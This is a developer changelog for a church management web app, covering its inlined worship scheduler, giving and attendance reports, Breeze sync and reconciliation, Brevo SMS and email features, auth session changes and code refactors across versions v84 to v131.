- **v131**: Auto-sync RSVP confirmations on scheduler tab open. `syncConfirmations` now accepts a `silent` boolean — when true, suppresses all status bar messages (no "No RSVP tokens found" noise on auto-call). `schedInitScheduler` in `scheduler-inline.js` now calls `syncConfirmations(true)` inside the `d1Pull().then()` callback, so confirmation statuses update automatically every time the Scheduler tab is opened. Manual "Sync Confirmations" button still works and shows status messages as before.
- **v130**: Scheduler "Send Reminder Emails" — add week-filter panel. Clicking the "Send Reminder Emails" button now opens a side panel (like Notify Volunteers) instead of sending immediately. Panel shows a Week dropdown defaulting to the next upcoming Sunday, a table of assigned volunteers with checkboxes (unchecked rows for people with no email), Select All / Deselect All, and a Send button. Each email covers only the selected Sunday's assignment(s) (not the full month schedule). New functions: `openReminderPanel`, `renderReminderList`, `_sendWeekReminders`. Cache: `_reminderAssignmentsCache` (pid→assignments). RSVP links and iCal attachment included same as the full-schedule flow.
- **v129**: Fix scheduler email sending in embedded (SC2) mode. Root cause: (1) `sendReminderEmails` and `sendVolunteerNotifications` checked `if (!s.resendKey || !s.emailFrom)` and returned early — but in embedded mode the Worker already has `RESEND_API_KEY` / `EMAIL_FROM` as env vars, so the local settings check should be skipped. Fixed by guarding with `if (!_embedded && ...)`. (2) When `s.resendKey` / `s.emailFrom` are `undefined` (not in localStorage), the headers were sent as the string `"undefined"` — the backend `||` fallback to env vars only fires on empty string, not a truthy `"undefined"`. Fixed to always pass `|| ''`. (3) RSVP links in reminder email bodies used `s.workerUrl` which may be empty in embedded mode; now uses `window.location.origin` as fallback via `_rsvpBase`. (4) `syncConfirmations` and `restoreRsvpTokens` also had `if (!s.workerUrl) return` guards skipped in embedded mode. The "Send Reminder Emails" button (already present) now works in embedded ChMS context to send schedule reminders to all assigned volunteers.
- **v128**: SC2 scheduler "Notify Volunteers" — add per-week filter. Previously the panel listed ALL open slots for the entire current month with no way to target a single week. Now: a "Week:" dropdown above the slot list shows each Sunday in the schedule with its open-slot count (`Apr 12, 2026 (3 open)`); default selection is the next upcoming Sunday with open slots. New `renderNotifySlots(weekFilter)` function re-renders when the dropdown changes. Internal: refactored to render from `_notifySlotsCache` so checkbox `data-slot-idx` always references the cached full slots array regardless of the displayed filter — `sendVolunteerNotifications` reads from the same cache, indices guaranteed to match.
- **v127**: Two fixes for scheduler console errors after expand started working in v126.
  - **`esc is not defined`**: scheduler's `<script>` runs BEFORE ChMS's `<script>` defines `esc()`. INIT block (`renderPeopleList`, `loadSchedule → renderTable`) threw `ReferenceError: esc is not defined` (caught harmlessly by `_safeInit` but ugly in console and broke initial paint). Step 2 of the JS transform was dropping the scheduler's own `esc()`. Fix: keep it; ChMS's later declaration overwrites it (both are functionally equivalent HTML escape helpers).
  - **CSP `connect-src 'self'` blocks `volunteer.timothystl.org` fetches**: scheduler historically lived at volunteer.timothystl.org and stored that URL in `workerUrl` settings. Now that everything is in the same Worker (chms.timothystl.org), `fetch(s.workerUrl + '/volunteer/pending')` becomes a cross-origin call → CSP blocks it. New step 3b in the JS transform strips `s.workerUrl +` and `settings.workerUrl +` prefixes from all `fetch(...)` calls (12 fetches across pending/general-pending/event-pending/claim/rsvp/email-send/etc.). The `workerUrl` setting is preserved for use in EMAIL BODY links (volunteers click them from their inbox — those need full URLs).
- **v126**: Fix the REAL cause of all broken scheduler clicks — `Uncaught ReferenceError: savePerson is not defined` was halting script execution at page load. Step 4 of the JS transform used `\bsavePerson\(` (and same for `fmtDate`, `showTab`, `deletePerson`) — requiring a `(` after the name, which only matched function CALLS but missed callback REFERENCES like `addEventListener('click', savePerson)` where the name is passed as a bare identifier with no parens. After renaming the function declaration to `schedSavePerson`, the bare `savePerson` reference pointed to nothing → ReferenceError → all `addEventListener` calls below that line never executed → no expand, no month nav, no nothing. Fix: switch all 4 renames to `\bNAME\b` (no paren requirement), so callback references are caught too. This is the actual fix; v123/v124/v125 were addressing symptoms (and CSS quirks that may or may not have been real).

### 2026-04-25
- **v125**: Continue fix for blocked scheduler clicks — the real culprit was `.side-panel`, not `.panel-overlay`. The 8 side panels (special, person, settings, notify, readings, signups, general, events) are all `position:fixed; right:0; width:min(520px,100vw); height:100vh; z-index:301` and use `transform:translateX(100%)` to slide off-screen when closed. In some scenarios their hit-test region still absorbs clicks even after the transform. Side-panel z-index 301 sits above the panel-overlay (z-index 300), so v124's overlay fix didn't help. Fix: append safety rules to the scoped CSS — `.sched-root .side-panel { pointer-events: none; }` and `.sched-root .side-panel.open { pointer-events: auto; }` (plus the same for `.panel-overlay`). Closed panels now pass clicks through unconditionally; the `.open` rule restores normal interaction. v124's inline JS was reverted because inline `style.pointerEvents='none'` would override the `.open { pointer-events:auto }` CSS rule when a panel actually opens.
- **v124**: Fix ALL scheduler click interactions broken (expand, month navigation, etc.). Root cause: the CSS scoping function (`_prefixSelectors`) was inserting comments into selectors, e.g. `.sched-root /* comment */ .panel-overlay`. CSS2.1 forbids comments inside selectors — the rule is silently dropped. The `panel-overlay` is `position:fixed; inset:0; z-index:300` covering the entire viewport; without `pointer-events:none` (dropped rule) it intercepted every click. Fix: strip `/* ... */` from selector text in `_prefixSelectors` before scoping, and explicitly set `panel-overlay.style.pointerEvents='none'` in `schedInitScheduler` as belt-and-suspenders.
- **v123**: Fix scheduler expand/collapse not working. Root cause: the `btn-expand-all` and individual row expand handlers toggled a `.visible` CSS class on `.sunday-detail` rows to show/hide them, relying on `.sched-root .sunday-detail.visible { display:table-row; }` in the embedded `<style>` tag. When the `<style>` is inside a `display:none` tab-panel at page load, some browsers apply those rules with unexpected specificity or timing. Fix: replace all three CSS-class-based visibility operations with explicit `style.display` manipulation (`'table-row'` / `'none'`), plus an explicit hide pass in `schedInitScheduler` after `d1Pull()` resolves to ensure detail rows start hidden even if CSS doesn't apply.
- **v122**: Fix scheduler still stuck on "Loading…" after v121. Root cause: the scheduler script has many top-level `document.getElementById(...).addEventListener(...)` calls that run at page load (lines 1126–1485 of the scheduler JS). Any one of those returning `null` would throw an uncaught `TypeError`, halting execution before `schedInitScheduler` could be assigned. v121 appended it at the end, making it unreachable on error. Fix: prepend `window.schedInitScheduler` at the very start of the transformed JS (position 0) so it is always defined before any top-level code runs. Also simplified: `schedInitScheduler` now calls `d1Pull()` directly with `typeof` guards instead of routing through `checkAuth()` (user is already authenticated in ChMS; the auth check is redundant and a potential failure point).
- **v121**: Fix scheduler not displaying people / month stuck on "Loading…". Root cause: `scheduler-inline.js` step 8 used a fragile regex to wrap the INIT block in `window.schedInitScheduler`. If the regex failed to match, `schedInitScheduler` was never defined, so `showTab('scheduler')` silently did nothing and `d1Pull()` was never called. Fix: remove the regex-based INIT wrapping; the INIT block now runs at page load (elements are in the DOM as part of the static HTML response). Append an explicit `window.schedInitScheduler` function at the end of the transformed script — it sets the month label directly and calls `checkAuth()` → `d1Pull()` when the user first opens the Scheduler tab. More robust: no fragile regex dependency.
- **v120**: IN3 + api-chms.js bugfix. Split `src/html-chms.js` (9,443 lines) into 13 focused fragment modules under `src/frontend/`: `html-head.js` (CSS + HTML head/layout), `html-tabs.js` (two exports: `HTML_TABS_1` + `HTML_TABS_2` split around the scheduler tab interpolation), `js-core.js` (state/helpers/init/showTab/filters), `js-settings.js` (member types/users/settings/Breeze status/print directory), `js-dashboard.js` (dashboard/prayer/follow-up), `js-people.js` (people list/person detail/crop modal), `js-register.js` (church register/CSV import), `js-households.js` (households/orgs/autocomplete), `js-giving.js`, `js-reports.js`, `js-export-import.js` (batch send/export/import), `js-attendance.js`, `js-volunteers.js`. All fragments use `String.raw\`` to preserve backslash sequences. `html-chms.js` reduced from 9,443 → 311 lines; assembles `CHMS_HTML` by concatenating imports + scheduler inline interpolation. Bundle size reduced 1,819 KiB (was 2,357 KiB). Also fixed pre-existing `api-chms.js:330` double-brace syntax error (extra `}` after giving dispatch block) that was blocking wrangler builds. Phase 4 complete.

### 2026-04-24
- **v118**: IN4 (3/5–5/5) — Extract `api-people.js`, `api-giving.js`, `api-reports.js`. `api-chms.js` now 533 lines (was 5,151): contains only ACL checks, dashboard handler, and 5 delegation blocks. New modules: `api-people.js` (467 lines — people CRUD/archive/brevo/photos/follow-ups), `api-giving.js` (170 lines — giving entries/batches/quick entry), `api-reports.js` (1,155 lines — reports/engagement/prayer/reconcile). Unused imports removed from `api-chms.js`. IN4 complete.
- **v117**: IN4 (2/5) — Extract `api-import.js`. All import, config, register, export, directory, board, and Breeze sync routes (lines 2271–5151 of old `api-chms.js`) moved to `src/api-import.js` as `handleImportApi(req, env, url, method, seg, db, isAdmin, isFinance, isStaff, canEdit)`. Returns `json({ error: 'Not found' }, 404)` for unmatched routes. `api-chms.js` shrunk from 5,151 → 2,276 lines. Imports `makeBreezeClient` from `./breeze.js` and `json` from `./auth.js`.
- **v116**: IN1 + chms subdomain. Worker renamed `breeze-proxy-worker` → `tlc-chms` in `wrangler.toml`. Added `chms.timothystl.org` custom domain — app now served at root with no `/chms` path required. `volunteer.timothystl.org/chms` returns 301 redirect to `chms.timothystl.org`. Root path on `chms.timothystl.org` serves ChMS app; root on other hosts serves public volunteer page. `tlc-newsletter-admin` service binding updated to `tlc-chms`; old `breeze-proxy-worker` Worker deleted. Phase 3 complete.
- **v115**: IN9 — Staging environment template added to `wrangler.toml`. `[env.staging]` block with name `breeze-proxy-worker-staging`, its own D1 (`tlc-volunteer-db-staging`), its own KV (`RSVP_STORE`), shared R2 (`tlc-chms-photos`), crons disabled. Placeholder IDs require manual setup before first deploy — see comments in `wrangler.toml` for step-by-step commands.
- **v114**: IN5 — Extract Breeze API client into `src/breeze.js`. New `makeBreezeClient(env)` factory: returns `null` when `BREEZE_SUBDOMAIN` or `BREEZE_API_KEY` are missing; exposes 9 endpoint methods (`givingList`, `auditLog`, `funds`, `fund`, `people`, `person`, `profile`, `tags`, `attendance`) plus `hdrs` and `subdomain` properties; all methods return raw `fetch` `Response` objects so all caller `.json()` / `.text()` / `.ok` error handling is unchanged. `people()` takes a pre-built query string (not a params object) to avoid double-encoding `filter_json` values. `subdomain` exposed on client for photo CDN URL construction in `import/breeze-sync-person` and `import/breeze` handlers. All 12 Breeze-calling handlers in `api-chms.js` updated to use the client; deletion audit log calls preserve their `end=today` argument; `filter_json` pre-encoding paths unchanged. Phase 2 complete.
- **v113**: IN12 — Dead-code sweep. Removed debug `console.log('[Breeze Sync] Full response:', r)` from per-person Breeze sync in `html-chms.js`. Removed dead `setFdTag` function (comment said "keep for legacy callers" but no callers existed anywhere in the file). Both files were otherwise clean — remaining comments are explanatory, `console.error` calls are the intentional global error boundary.
- **v112**: AT6 + SMS1.
  - **AT6** — Attendance by Service tile now supports multi-year comparison. Added Date Range / Multi-Year toggle buttons on the tile. Multi-Year mode shows year checkboxes (`#rpt-att-svc-years`, last 5 years, 2 most recent pre-checked). API: new `years=` param on `GET /admin/api/reports/attendance-by-time` runs parallel D1 queries per year and returns `{ mode: 'multi-year', years, by_time_years }`. New `renderMultiYearServiceChart(d, h)` draws a grouped bar chart (X = service times, one bar per year in palette colors). New `_buildAttByServiceMultiYearHtml(d, h)` renders chart + summary table. Resize handler now branches on `_lastByServiceRptData.mode`. Date Range mode unchanged.
  - **SMS1** — Birthday/anniversary SMS via Brevo Transactional SMS API. New `sms_opt_in INTEGER NOT NULL DEFAULT 0` column on `people` table (`migrations/0002_add_sms_opt_in.sql`; also in `src/db.js` migrations array). New functions in `src/api-emails.js`: `normalizePhone()` (E.164: 10-digit gets `+1`, 11-digit starting with 1 gets `+`), `sendBrevoSms()` (POST to `api.brevo.com/v3/transactionalSMS/sms`), `sendBirthdayTexts(env)` and `sendAnniversaryTexts(env)` (same dedup/query patterns as email equivalents). New endpoints: `POST /admin/api/sms/run-birthday` and `POST /admin/api/sms/run-anniversary` (admin only). Both SMS functions added to daily cron alongside email sends. Audit log prune updated to include `birthday_sms_sent`/`anniversary_sms_sent` in 60-day bucket. Person edit form: "Opt in to birthday & anniversary texts (SMS)" checkbox below phone field; wired into `openPersonEdit()` and `savePerson()`. Settings: new SMS test card with test buttons; `runSmsTest(type)` function mirrors `runEmailTest()`.

### 2026-04-23
- **v111**: SC2 — Scheduler inlined into ChMS SPA (no iframe). Removed `<iframe id="scheduler-iframe">` from `#tab-scheduler`; replaced with `${getSchedulerInline()}` from new `src/scheduler-inline.js`. The helper transforms `SCHEDULER_HTML` at module load time: (1) CSS — drops `:root` (already in ChMS) and `body.embedded` rules, then prefixes all remaining selectors with `.sched-root` using a stateful parser that handles `@media` and `@keyframes` correctly; (2) HTML — drops `<div id="login-screen">` and `<header>`, renames `id="app-content"` → `id="sched-app-content"` and all `tab-*` / `tab-btn-*` / `current-month-label` IDs; wraps in `<div class="sched-root">`; (3) JS — hard-codes `_embedded = true`, removes duplicate `esc()`, fixes `fetch('lcms_calendar.json')` → `/scheduler/lcms_calendar.json`, renames 4 conflicting functions (`fmtDate`, `showTab`, `savePerson`, `deletePerson` → `sched*` prefixed), fixes `'tab-' + t` / `'tab-btn-' + t` patterns, moves `checkAuth()` + INIT block into `window.schedInitScheduler()` (called once on first tab visit from ChMS `showTab('scheduler')`). The `/scheduler` route and `SCHEDULER_HTML` are unchanged — the standalone scheduler page still works.
- **v110**: R3 — People Insights report. New "People Insights" tile on Reports tab (no login required beyond staff). New `GET /admin/api/reports/people-insights` endpoint runs 7 queries in parallel and returns: (1) new contacts by month (last 24 months, using `first_contact_date` falling back to `created_at`) → bar chart; (2) active people grouped by first-contact year × current member type (last 5 years) → cross-tab table; (3) age-group distribution (Under 18/18–29/30–44/45–64/65+/Unknown) → horizontal bar chart; (4) gender breakdown → pie chart using existing `renderPieChart`; (5) household size buckets (single/couple/small family/large family/no household) → horizontal bar chart; (6) sacramental pipeline for members only (neither/baptized only/confirmed only/both) → horizontal bar chart.
- **IN7 + IN8** (no version bump — backend/infra only):
  - **IN7** — Schema migrations system. Created `migrations/0001_baseline.sql` with the complete current schema (all tables, all columns as of today). Added `migrations_dir = "migrations"` to `wrangler.toml` `[[d1_databases]]` section. Future schema additions go in new numbered SQL files and are applied with `wrangler d1 migrations apply tlc-volunteer-db --remote`. The existing `initDb()` in `src/db.js` remains as a cold-start safety net (all `CREATE TABLE IF NOT EXISTS` / try-catch ALTER TABLE).
  - **IN8** — Audit log pruning. Added `pruneAuditLog(db)` in `tlc-volunteer-worker.js`, called from the existing daily cron (`0 14 * * *`). Two-tier retention: `birthday_email_sent` and `anniversary_email_sent` rows deleted after 60 days (they only serve same-day dedup); all other audit entries deleted after 365 days (covers financial and destructive actions). Logged to cron console as `audit_prune: { email_dedup_deleted, general_deleted }`.
- **v109**: AT5 — Christmas/Easter markers on attendance chart + separate Special/Midweek services chart.
  - Attendance chart markers now use `xAtAnyDate(dateStr)` interpolation instead of `dataPts.indexOf(date)`. The old approach only found a date if it was an exact Sunday data point; Christmas Eve (Dec 24) and Christmas Day (Dec 25) are almost never on a Sunday, so markers never appeared. The new function binary-searches the sorted Sunday x-positions and linearly interpolates between the two nearest Sundays so any calendar date renders a correctly-positioned vertical line.
  - Easter and Christmas dashed markers now show reliably on the main Sunday chart. Fixed variable collision (`edy` → `edy2`) in Easter date calculation. Legend updated with green (Easter) and purple (Christmas) entries.
  - New `renderSpecialServicesChart(services)` bar chart rendered into `#att-special-wrap` div below the main chart. Filters `service_type !== 'sunday'` services with attendance > 0. Amber bars for `special` (Christmas Eve/Day, Good Friday, Easter Vigil, etc.), purple bars for `midweek` (Ash Wednesday, Lent, Advent, etc.). Tooltip on hover shows date + service name + attendance. Midweek services are excluded from the Sunday average line since the main chart already filters to `service_type='sunday'`.
  - New `+ Special` button opens inline form (`openSpecialServiceEntry`) with Date, Type dropdown (special/midweek), Service Name (with datalist suggestions), Attendance, and Time. Saves via `saveSpecialService()` → `POST /admin/api/attendance` with `service_type` set appropriately.

### 2026-04-22
- **v106**: Dashboard "Last Sunday" card now labels each service row by time (e.g. `8 AM`, `10:45 AM`) instead of the per-row `service_name` (which was often a date). `/admin/api/dashboard` recentAttendance query now also returns `service_time`; frontend `dashStatServices` derives the label via new `fmtServiceTime` helper and sorts rows earliest-first. Falls back to `service_name` → `'Service'` if `service_time` is missing.
- **v104**: FU2 — New-contact follow-up tracking. Uses the `first_contact_date` / `followup_status` / `followup_notes` plumbing added in v103. Auto-sets `first_contact_date = today` on manually-added people (Breeze imports skip — they can be set later). New endpoints: `GET /admin/api/engagement/followup-queue` and `POST /admin/api/engagement/update-followup`. Dashboard gets a "New Contacts" card (editor+ only) with Notes / Done / Open actions — Notes opens a prompt to save/edit text and auto-sets status='in_progress'; Done sets status='done' and removes from queue. Dashboard endpoint pre-fetches the first 5 plus the pending count. Customize panel adds a `newContacts` toggle (defaults on).
- **v103**: DC1 + DB9 — Weekly review queue on the dashboard. Goal: spread an annual triage of visitor/friend records across ~52 weekly batches so the backlog never piles up. New person fields via migration: `last_reviewed_at`, `first_contact_date`, `followup_status`, `followup_notes` (the latter three are plumbing for FU2 in a follow-up PR). New endpoints: `GET /admin/api/engagement/review-queue?limit=5&stale_days=365` returns stale non-member/non-organization active records ordered stalest-first; `POST /admin/api/engagement/mark-reviewed` sets `last_reviewed_at = date('now')`. Dashboard adds a "Weekly Review Queue" card (editor+ gated) with inline actions Reviewed / Archive / Open. Dashboard endpoint also returns the next 5-record batch + `reviewQueueTotal` for the card header. Prefs: `reviewQueue` toggle added to the Customize panel (defaults to on).
- **v102**: Three more reports (R8, R1, R10).
  - **R8** — Giving × Attendance overlay. New `GET /admin/api/reports/giving-vs-attendance?from=&to=` groups both by Sunday-of-week. New "Giving × Attendance" tile on Reports tab. Dual-axis chart: green attendance bars (left axis) + teal giving line (right axis). Overview cards show Weeks, Total Attendance, Total Given, Avg per Attender, and Pearson correlation with qualitative label.
  - **R1** — Age-group breakdown. Computed via SQLite `julianday('now') - julianday(dob)` for buckets Under 18 / 18–29 / 30–44 / 45–64 / 65+ / Unknown. Membership Summary gets a "By Age Group" table (count + share). Giving by Fund gets a richer age-group table (givers, gifts, total, avg/giver, share). Attendance age groups deferred — needs per-person attendance (R6).
  - **R10** — Avg / Giver stat added to Giving by Fund overview (5th tile). "Average Gift" relabeled to "Avg / Gift" for symmetry. Age-group rows also include per-group Avg/Giver.
- **v101**: Three fixes on v99 reports. (1) `openProfile` calls in R2/R5 drill-downs didn't exist — function is `openPersonDetail`. Three occurrences renamed; clicking a row on Giving Insights / Contact Completeness drill-down now opens the person's profile. (2) Giving Trend Easter/Christmas markers now use day-of-year mapping (Jan 1 → leftmost, Dec 31 → rightmost) instead of month-fraction, so Dec 25 stays inside the chart viewbox. (3) Resize handler duplicated the trend-chart build inline and was missing the marker code — added Easter/Christmas markers to the resize branch so they persist after drag-resize.
- **v100**: Fix Giving Insights 500 — SQL referenced `ge.amount_cents` but the actual column in `giving_entries` is `amount` (stored as integer cents). Replaced four occurrences in the new `reports/giving-insights` endpoint with `SUM(ge.amount) AS total_cents` / `SUM(ge.amount) AS prior_total_cents`.
- **v99**: Reporting pack — four improvements to the Reports tab.
  - **R7** — Easter/Christmas markers on Giving Trend chart. Easter computed per-year via Meeus/Jones/Butcher Gregorian algorithm and rendered as a dashed vertical line in each year's color with an "E" label. Christmas is a shared Dec 25 dashed line in warm-gray with a "C" label. Legend updated.
  - **R9** — Pie chart on Giving by Method. New reusable `renderPieChart(items, diameter)` helper (SVG slices + legend). Renders a "Share by Method" block above the existing table.
  - **R5** — Contact Info Completeness report. New tile on Reports tab. `GET /admin/api/reports/contact-completeness?scope=active|member&field=...` returns counts (or drill-down list) of people missing email/phone/address/dob/photo. UI shows progress bars with scope toggle; clicking a row drills to the people list (clickable to profile). Excludes organizations.
  - **R2** — Giving Insights report. New tile (Year input). `GET /admin/api/reports/giving-insights?year=YYYY` returns top 25 givers, lapsed givers (prior year donor absent this year), frequency histogram (1 / 2–5 / 6–12 / 13–26 / 27+ gifts), and 5-year average-gift trend. UI renders four blocks with clickable rows.

### 2026-04-21
- **v98**: Fix latent SyntaxError in scheduler auto-logout banner — `b.innerHTML='...<button onclick="document.getElementById(\'inact-warn\')...'` was using `\'` to escape inner single quotes, but `SCHEDULER_HTML` is a template literal where `\'` evaluates to `'`. So the served JS was `b.innerHTML='...document.getElementById('inact-warn')...'` — the inner single quote terminated the outer string and `inact-warn` became an unexpected identifier. This SyntaxError stopped script parsing entirely, which is why everything after that point silently failed (including the month label update and full scheduler boot). Fix: replace inline `onclick` with `addEventListener`, and build the DOM via `createElement`/`createTextNode`/`appendChild` instead of `innerHTML` — no more quote-escaping needed. This bug had been latent since the scheduler was first bundled (commit 92d8314, way back); it surfaced only because v97's `_safeInit` made the rest of the init resilient enough to expose it.
- **v97**: SC1 fix — month label stuck on "Loading…". v96 made the iframe load (server-side body class injection worked) but the month label stayed at its placeholder "Loading…" text. The label is updated by the script's bottom init block (was line 3911-3912), and clearly something in the earlier init calls (`migrateOldSchedule`, `getPendingSignups`, etc.) was throwing and short-circuiting the rest. Hardened: (1) Move the month label update to be the FIRST init step, wrapped in try/catch, so it never gets blocked. (2) Wrap each subsequent init call in a `_safeInit(name, fn)` helper that logs to console.error on failure but doesn't break the chain. Net result: even if one init step throws, the others still run, and the month label always gets set correctly.
- **v96**: SC1 fix — server-side embedded mode injection. v94/v95 still showed "Checking authentication…" for the user, so the JS-based embedded detection clearly wasn't taking effect (likely browser-cached scheduler HTML or some script-execution issue). Moved embedded-mode activation to the worker: when `/scheduler?embedded=1` is requested, the response HTML has `<body>` rewritten to `<body class="embedded">` before being sent. The CSS rules added in v95 (hide #login-screen, show #app-content, hide header/tabs) then kick in immediately during HTML parsing, before any JS runs. JS detection updated to also check `document.body.classList.contains('embedded')` as the primary signal. Net result: even with no JS execution at all, the iframe shows the scheduler UI directly with no auth screen.
- **v95**: SC1 fix — Scheduler iframe still showing "Checking authentication…" after v94. Two-part hardening: (1) Embedded detection now uses `window.self !== window.top` as the primary signal (true iframe detection) with `?embedded=1` as a fallback, instead of relying solely on the URL param. (2) Added CSS rules `body.embedded #login-screen { display:none!important; }` and `body.embedded #app-content { display:block!important; }` so that as soon as `document.body.classList.add('embedded')` runs at the top of the script, the login screen is hidden via CSS — independent of whether `checkAuth()` later succeeds. Belt-and-suspenders: even if some downstream JS error blocks `checkAuth()`, the login screen is gone the moment the embedded class is set.
- **v94**: SC1 fix — Scheduler iframe was stuck on "Checking authentication…". The scheduler's `checkAuth()` does a probe fetch to `/admin/api/scheduler/data` and only hides the login screen on success. In an iframe context that probe was hanging or being silently rejected (likely a SameSite=Strict cookie quirk inside iframes), so the login screen never went away. The probe is redundant when embedded — the `/scheduler` route already verified auth before serving the HTML, and the parent ChMS manages session timeouts. In embedded mode, skip the probe entirely: hide the login screen, show app-content, and call `d1Pull()` + the volunteer fetches directly. Standalone mode unchanged.
- **v93**: SC1 fix — Scheduler tab was loading blank. Two bugs: (1) `<iframe src="">` causes `iframe.src` to return the resolved parent page URL (not empty string), so the lazy-load check `!fr.src` was always false and the scheduler URL never got set. Switched to `getAttribute('src')` and use `setAttribute()` to assign. (2) `flex:1` on the iframe inside a flex container is unreliable across browsers — iframes don't have intrinsic height. Switched to explicit `height:calc(100vh - 50px)` matching the topbar height. Removed the `src=""` attribute entirely so the iframe stays empty until first click.
- **v92**: SC1 — Worship Scheduler integrated as a tab inside the ChMS SPA. The standalone `/scheduler` page now also supports `?embedded=1` mode: in embedded mode the scheduler's own header and tab bar are hidden via a `body.embedded` CSS class, the auto-logout timer is suppressed (parent ChMS manages the session), and auth-failure redirects go to `window.top` instead of `window.location`. A "Scheduler" sidebar item (admin-only) replaces the previous external "Scheduler ↗" link; clicking it activates a new `#tab-scheduler` panel that lazy-loads an `<iframe src="/scheduler?embedded=1">` on first click. The iframe fills the full content height with `padding:0;overflow:hidden`. Existing Volunteers tab removes the now-redundant "Open Scheduler ↗" link.
- **v91**: Dashboard birthday card — members only. The month-at-a-time birthday query excluded `visitor/inactive/other/organization` but let through blank, null, and any other non-standard `member_type` values (e.g. `friend`, `attender`, empty string), which is why non-members like Stella Harris were appearing. Changed to a strict `LOWER(member_type) = 'member'` filter, matching the DB1 member-count stat. Anniversary card and birthday email cron untouched — ask if those should follow the same rule.
- **v90**: Giving by Fund report — totals overview + method breakdown. Extended `GET /admin/api/reports/giving-summary` to also return `total_transactions` and `by_method` (method/contributions/total_cents). Report now opens with a four-tile overview (Total Givers, Total Transactions, Total Given, Average Gift) followed by a Method Overview table (Cash / Check / Card-Online / ACH-Bank / Other with gift counts, totals, and share percentage), then the existing By Fund table. Queries run in parallel with the fund query so the endpoint remains a single round-trip. New `.rpt-overview` / `.rpt-stat` CSS classes for the stat tiles.
- **v89**: Force Remove Orphans. v88's Diagnose confirmed all 43 extras for the 2025 discrepancy were pure "orphan" rows (valid `breeze_id`, not in Breeze's current giving/list). Root cause: when the user deletes a whole batch in Breeze the `bulk_contributions_deleted` audit event references the batch, not the individual payment IDs — so the sync's `deletedPaymentIds` set misses them and re-imports them on every run. v86's Reconcile Orphans can't clean them because its "current replacement exists for same person+date" safety check fails for outright deletions. New endpoint `POST /admin/api/giving/force-remove-orphans` deletes DB entries whose `breeze_id` is not in giving/list for the window *without* that safety check. Safeguards: (1) admin-only (not just finance); (2) caller must pass `confirm_count` and `confirm_cents` matching what the server recomputes — refuses on mismatch so the button can't run against stale data; (3) refuses if giving/list returned fewer than 100 payments (truncation guard); (4) only touches `breeze_id != ''` rows (manual/quick-entry can never be affected); (5) logs an `audit_log` entry `force_remove_orphans` with the date range, cents total, and list of removed ids. UI: red "Force Remove N" button on the Diagnose results header (admin only, hidden when extras=0); confirm dialog shows count and total; on success, reruns the Giving by Fund report.
- **v88**: Giving reconcile diagnostic. New read-only endpoint `GET /admin/api/giving/reconcile-diagnose?from=YYYY-MM-DD&to=YYYY-MM-DD` returns every DB giving_entry in the date range alongside a classification for each row: `in_breeze` (breeze_id matches a Breeze giving/list payment ID), `no_breeze_id` (manual entry / quick-entry / pre-payment-ID import — invisible to Reconcile Orphans because its filter requires `breeze_id != ''`), `split_suffix_base_in_breeze` / `split_suffix_orphan` (CSV importer's `pid-N` multi-row split IDs), and `orphan` (breeze_id absent from Breeze). Response also includes per-fund extras totals (which funds carry the discrepancy), classification counts, a twin-detection pass (rows sharing person+date+amount across different breeze_ids), and a `missing_from_db` list (inverse: Breeze payments with no DB row). Use case: the 4-fund / 43-entry / $9,743.50 2025 discrepancy survives sync + reconcile-orphans, so this tool shows which rows are the extras and why they aren't cleaned up. "Diagnose" button added next to "Reconcile Orphans" on the Giving by Fund report; results view includes fund breakdown, per-row table, and "Export Extras CSV". Read-only — no `giving_entries` mutations. Finance-gated.
- **v87**: Fix giving sync re-importing contributions deleted in a later year. `contribution_deleted` and `bulk_contributions_deleted` audit log events were fetched with `end=${end}` (e.g. 2025-12-31 for a 2025 sync). A 2025 contribution corrected/deleted in 2026 has its deletion event in 2026, outside that window — so `deletedPaymentIds` missed it and the old entry was re-imported every sync. Fix: fetch deletion events with `end=today` (not capped at the sync window end). Addition and update events still use the original `end` so no new 2026 data bleeds into a 2025 sync.
- **v86**: Giving by Fund report improvements. (1) Total givers count now shown below the report title (parallel query on `COUNT(DISTINCT person_id)`). (2) New `POST /admin/api/giving/reconcile-orphans` endpoint: fetches Breeze giving/list for a date range, finds DB entries whose `breeze_id` no longer exists in Breeze, removes them (same safety check as the sync orphan pass). (3) "Reconcile Orphans" button added to the report — runs the cleanup for the same date range as the report and reloads if any orphans were removed. Addresses 2025 discrepancy: app $547,367 vs Breeze $537,624 due to stale pre-G10 orphaned entries.
- **v87**: Suppress benign `ResizeObserver loop completed with undelivered notifications` warning in both `window.onerror` and the `window.addEventListener('error')` handler, so the chart drag-to-resize code doesn't trigger the red error banner on pages with multiple charts (e.g. Reports tab).
- **v86**: Auth — shorten session lifetime. Cookie is now a session cookie (no `Expires`) so it dies when the browser closes. Absolute 7-day lifetime replaced with a 30-minute sliding idle timeout (`IDLE_TIMEOUT_MS` in `src/auth.js`); the cookie is refreshed on every authenticated request via `refreshAuthCookie` wrapped into the main fetch handler, so activity rolls the timeout forward. Addresses "logged in for 7 days = no password" concern. Frontend already redirects on 401 so no client changes needed.
- **v85**: G10 fix — Orphan cleanup pass added to Breeze giving sync. When Breeze edits a contribution it creates a new payment ID; the old DB entry becomes stale ("orphaned"). The supplement pass (v74) already imports the corrected version from giving/list; this new pass detects DB entries in the sync window whose `breeze_id` no longer appears in giving/list and removes them if a current replacement exists for the same person+date. This resolves G10 (correction pass was always 0) and allows G11/G12/G13/G14 corrections made in Breeze to apply automatically on next sync. Response now includes `orphansRemoved` count; status message updated accordingly.

### 2026-04-20
- **v84**: EM1 — Brevo newsletter sync. Three Brevo helpers in `src/api-emails.js` (`brevoUpsertContact`, `brevoBulkSync`, `brevoGetListContacts`). Three endpoints in `api-chms.js`: `POST /admin/api/brevo/sync-contact` (single contact, staff+), `POST /admin/api/brevo/bulk-sync` (all members, admin), `GET /admin/api/brevo/reconcile` (comparison view, admin). Auto-sync: on person PUT, if email changed and member_type='member', fires `brevoUpsertContact` (non-fatal). Frontend: "Add to Newsletter" button on person profile contact section; Settings card with "Check Brevo Sync" (reconciliation view showing missing members + Add All Missing button) and "Bulk Sync All Members".
